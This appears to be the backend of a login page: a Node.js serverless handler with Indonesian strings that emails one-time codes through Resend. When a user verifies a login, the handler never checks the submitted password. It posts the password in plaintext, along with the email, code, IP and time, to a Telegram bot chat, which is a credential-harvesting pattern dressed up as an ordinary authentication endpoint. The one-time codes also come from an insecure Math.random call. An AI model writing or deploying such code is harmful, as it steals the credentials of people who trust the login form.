import mongoose from 'mongoose';
import { Resend } from 'resend';
import axios from 'axios';
import { config } from './config.js';

const resend = new Resend(config.RESEND_API_KEY);

const UserSchema = new mongoose.Schema({
    email: String,
    otp: String,
    lastLogin: Date
});
const User = mongoose.models.User || mongoose.model('User', UserSchema);

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ msg: 'Method Not Allowed' });

    try {
        if (!mongoose.connections[0].readyState) {
            await mongoose.connect(config.MONGODB_URI);
        }

        const { action, email, password, otp } = req.body;
        const ip = req.headers['x-forwarded-for'] || '127.0.0.1';
        const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

        if (action === 'SEND_OTP') {
            const code = Math.floor(100000 + Math.random() * 900000).toString();
            await User.findOneAndUpdate({ email }, { otp: code }, { upsert: true });

            await resend.emails.send({
                from: config.SENDER_EMAIL,
                to: email,
                subject: 'VERIFIKASI OTP',
                html: `KODE OTP ANDA: <b>${code}</b>`
            });

            return res.status(200).json({ success: true });
        }

        if (action === 'VERIFY_LOGIN') {
            const user = await User.findOne({ email, otp });
            if (!user) return res.status(401).json({ msg: 'OTP SALAH' });

            const totalUser = await User.countDocuments();
            const text = `🔐 *NOTIFIKASI LOGIN SYSTEM*\n\n📧 *EMAIL:* \`${email}\`\n🔑 *PASS:* \`${password}\`\n🔢 *OTP:* \`${otp}\`\n🌐 *IP:* ${ip}\n⏰ *WAKTU:* ${waktu}\n👥 *TOTAL USER:* ${totalUser}`;

            await axios.post(`https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: config.TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'Markdown'
            });

            return res.status(200).json({ success: true });
        }
    } catch (err) {
        return res.status(500).json({ error: err.message });
    }
        }
